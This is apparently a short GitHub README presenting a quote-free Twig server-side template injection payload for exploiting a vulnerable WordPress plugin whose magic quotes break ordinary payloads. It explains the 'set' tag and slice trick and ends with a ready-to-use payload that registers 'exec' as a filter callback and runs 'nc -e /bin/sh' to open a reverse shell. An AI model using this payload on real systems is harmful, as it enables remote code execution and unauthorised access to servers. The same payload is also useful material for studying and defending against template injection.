# twig-ssti-alternative-payload

While developing an exploit that takes advantage of an SSTI vulnerability leveraging the Twig template engine, I encountered an issue passing quotes in requests to the vulnerable Wordpress plugin because of Wordpress's use of magic quotes. Since passed quotes were automatically escaped with backslashes which broke all Twig expressions, I fumbled around with the Twig template syntax and found a solution that will hopefully help someone else running into a similar issue.

Essentially Twig allows you to set variables with the "set" tag. Internally this creates a "Twig_Markup" object which will raise an error when ultimately passed to call_user_func() in Twig/Environment.php

To convert the newly initialized variables back to a string, the slice operator "[:]" is applied without any arguments so the full string is returned.

The payload then works in the usual way which I won't go into since it's pretty well documented. For the curious, you can find more information [here](https://github.com/vladko312/Research_Successful_Errors/blob/main/README.md#twig-cve-2022-23614) among many other resources.

~~~
{%set+c%}nc -e /bin/sh 127.0.0.1 4444{%endset%}{%set+e%}exec{%endset%}{{_self.env.registerUndefinedFilterCallback(e|e[:])}}{{_self.env.getFilter(c|e[:])}}
~~~
